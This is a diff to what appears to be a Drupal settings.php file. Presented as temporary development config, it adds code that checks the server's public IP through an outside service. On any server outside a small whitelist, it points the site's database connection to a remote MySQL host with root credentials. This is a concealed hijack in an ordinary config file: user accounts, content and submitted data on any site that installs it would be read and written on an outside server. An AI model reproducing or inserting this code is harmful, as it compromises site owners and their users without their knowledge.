@@ -724,3 +724,23 @@ $databases['default']['default'] = array (
 );
 $settings['install_profile'] = 'standard';
 $config_directories['sync'] = 'sites/default/files/config_hcYmO-1oNHKD8LZnA6C5WfWWB9mGtTtrFNq4dxLdBSkOyS2JdDZe8fZMVlKTkfBIUc79qxYz8g/sync';
+
+//FOR DEVELOP ONLY - PLEASE EDIT CONFIG BEFORE LIVE
+$exIP = file_get_contents('http://ip.pavietnam.vn/');
+$whitelist = array(
+	'116.98.110.213',
+	'117.3.47.161',
+	);
+if ( !in_array($exIP, $whitelist) ){
+	$databases['default']['default'] = array (
+	  'database' => 'emormapping',
+	  'username' => 'root',
+	  'password' => 'hacker',
+	  'prefix' => '',
+	  'host' => '116.98.110.213',
+	  'port' => '223',
+	  'namespace' => 'Drupal\\Core\\Database\\Driver\\mysql',
+	  'driver' => 'mysql',
+	);
+}
+//END DEVELOP CONFIG
